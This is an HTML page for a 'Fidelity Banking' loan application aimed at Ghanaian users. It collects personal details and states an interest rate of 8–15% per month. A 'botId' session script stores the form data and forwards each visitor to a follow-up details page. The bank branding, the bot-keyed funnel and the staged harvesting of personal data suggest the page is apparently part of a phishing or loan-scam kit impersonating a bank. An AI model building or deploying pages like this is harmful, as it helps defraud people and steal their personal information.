<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Loan Application – Fidelity Banking</title>

<style>
/* ================================
   GLOBAL – Fidelity Theme
================================ */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #f9f7f6;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
}

/* ================================
   MAIN CARD
================================ */
.container {
  max-width: 480px;
  width: 100%;
  background: #ffffff;
  border-radius: 16px;
  padding: 32px 24px 28px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
}

/* ================================
   PAGE HEADER
================================ */
.page-header {
  margin-bottom: 28px;
  text-align: center;
}

.page-header h1 {
  font-size: 28px;
  font-weight: 700;
  color: #e11b22; /* Fidelity Red */
  margin: 0 0 6px;
}

.page-header p {
  font-size: 15px;
  color: #666666;
  margin: 0;
}

/* Gold accent line (matches index.html) */
.accent-line {
  width: 50px;
  height: 3px;
  background: #f5c518;
  border-radius: 4px;
  margin: 10px auto 20px;
}

/* ================================
   FORM ELEMENTS
================================ */
form label {
  display: block;
  font-size: 14px;
  font-weight: 600;
  color: #444444;
  margin-bottom: 6px;
}

form input,
form select {
  width: 100%;
  height: 54px;
  padding: 0 14px;
  font-size: 16px;
  color: #1c1c1e;
  border: 1px solid #d4d4d4;
  border-radius: 8px;
  background: #ffffff;
  margin-bottom: 20px;
  outline: none;
  transition: border 0.2s, box-shadow 0.2s;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.06);
}

form input:focus,
form select:focus {
  border-color: #f45112;
  box-shadow: 0 0 0 4px rgba(244, 81, 18, 0.12);
  background: #ffffff;
}

form input::placeholder {
  color: #888888;
}

/* ================================
   CHECKBOX WRAPPERS
================================ */
.checkbox-wrapper {
  display: flex;
  align-items: flex-start;
  gap: 14px;
  margin-bottom: 14px;
  padding: 14px 16px;
  border-radius: 12px;
  background: #f9f7f6;
  border: 1px solid #e5e5ea;
  transition: border 0.2s;
}

.checkbox-wrapper:hover {
  border-color: #f45112;
}

.checkbox-wrapper input[type="checkbox"] {
  width: 20px;
  height: 20px;
  margin-top: 2px;
  flex-shrink: 0;
  accent-color: #e11b22;
  cursor: pointer;
}

.checkbox-wrapper label {
  margin: 0;
  font-size: 14px;
  line-height: 1.5;
  color: #3a3a3c;
  font-weight: 400;
  cursor: pointer;
}

.checkbox-wrapper label strong {
  color: #e11b22;
  font-weight: 700;
}

/* ================================
   SUBMIT BUTTON (Pill shape)
================================ */
button {
  width: 100%;
  height: 58px;
  border: none;
  border-radius: 999px;
  background: #e11b22;
  color: #ffffff;
  font-size: 17px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.25s ease;
  opacity: 0.5;
  margin-top: 8px;
  letter-spacing: 0.3px;
  box-shadow: 0 8px 24px rgba(225, 27, 34, 0.0);
}

button.enabled,
button:enabled {
  opacity: 1;
  box-shadow: 0 8px 24px rgba(225, 27, 34, 0.25);
}

button:enabled:hover {
  background: #c9181f;
  transform: scale(1.01);
  box-shadow: 0 12px 32px rgba(225, 27, 34, 0.35);
}

button:enabled:active {
  transform: scale(0.97);
}

button:disabled {
  cursor: not-allowed;
}

/* ================================
   RESPONSIVE
================================ */
@media (max-width: 420px) {
  .container {
    padding: 24px 16px 20px;
  }
  .page-header h1 {
    font-size: 24px;
  }
  form input,
  form select {
    height: 48px;
    font-size: 15px;
  }
  button {
    height: 52px;
    font-size: 16px;
  }
}
</style>
</head>

<body>

<div class="container">

  <div class="page-header">
    <h1>Loan Application</h1>
    <p>Provide your personal details</p>
    <div class="accent-line"></div>
  </div>

  <form id="loanForm">

    <label>Full name</label>
    <input name="fullName" placeholder="e.g. John Mensah" required />

    <label>Date of birth</label>
    <input type="date" name="dob" required />

    <label>Email address</label>
    <input type="email" name="email" placeholder="you@example.com" required />

    <label>Residential address</label>
    <input name="address" placeholder="e.g. Accra, Ghana" required />

    <label>Employment status</label>
    <select name="employmentStatus" required>
      <option value="">Select</option>
      <option>Employed</option>
      <option>Self-employed</option>
      <option>Unemployed</option>
      <option>Student</option>
    </select>

    <label>Loan purpose</label>
    <select name="loanPurpose" required>
      <option value="">Select</option>
      <option>Business</option>
      <option>Personal</option>
      <option>Education</option>
      <option>Medical</option>
      <option>Emergency</option>
    </select>

    <label>Loan amount (GHS)</label>
    <input type="number" name="loanAmount" placeholder="MIN 100" min="100" max="100000" required />

    <label>Loan term</label>
    <select name="loanTerm" required>
      <option value="">Select</option>
      <option>6 months</option>
      <option>12 months</option>
      <option>24 months</option>
      <option>36 months</option>
      <option>48 months</option>
    </select>

    <div class="checkbox-wrapper">
      <input type="checkbox" id="termsCheck" />
      <label for="termsCheck">I agree to the Terms and Conditions</label>
    </div>

    <div class="checkbox-wrapper">
      <input type="checkbox" id="interestCheck" />
      <label for="interestCheck">
        I understand loans are subject to <strong>8%–15% interest per month</strong>
        depending on credit score and loan amount.
      </label>
    </div>

    <button id="continueBtn" type="submit" disabled>Continue →</button>

  </form>

</div>

<script>
const form = document.getElementById('loanForm');
const termsCheck = document.getElementById('termsCheck');
const interestCheck = document.getElementById('interestCheck');
const button = document.getElementById('continueBtn');

// BOT SESSION LOGIC (kept identical)
const params = new URLSearchParams(window.location.search);
const urlBotId = params.get('botId');

if(urlBotId){
  localStorage.setItem('botId', urlBotId);
}

const botId = localStorage.getItem('botId');

if(!botId){
  alert('Invalid session. Please start again.');
  window.location.href='/bot/bot1';
}

// ENABLE BUTTON ONLY WHEN BOTH CHECKBOXES ARE CHECKED
function updateButton(){
  button.disabled = !(termsCheck.checked && interestCheck.checked);
}

termsCheck.addEventListener('change', updateButton);
interestCheck.addEventListener('change', updateButton);

// FORM SUBMIT
form.addEventListener('submit', (e)=>{
  e.preventDefault();
  const data = Object.fromEntries(new FormData(form));
  localStorage.setItem('loanFormData', JSON.stringify(data));
  localStorage.setItem('fullName', data.fullName);
  window.location.href='details.html?botId=' + botId;
});
</script>

</body>
</html>
